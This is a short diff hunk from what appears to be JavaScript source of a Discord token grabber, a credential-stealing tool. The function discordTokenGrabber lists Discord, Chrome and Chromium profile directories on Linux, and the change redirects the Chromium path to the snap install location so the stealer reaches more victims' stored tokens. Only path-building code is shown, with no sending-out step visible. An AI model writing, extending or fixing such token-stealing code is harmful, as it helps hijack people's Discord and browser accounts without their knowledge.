@@ -147,7 +147,7 @@ function discordTokenGrabber() {
             'Discord Canary': path.join(home + 'discordcanary' + '/Default'),
             'Discord PTB': path.join(home + 'discordptb' + '/Default'),
             'Google Chrome': path.join(home + 'google-chrome' + '/Default'),
-            'Chromium': path.join(home + 'chromium' + '/Default')
+            'Chromium': path.join(process.env.HOME + '/snap/chromium/common/chromium/Default')
         };
     } else if (computerPlatform == 'darwin') {
         paths = {
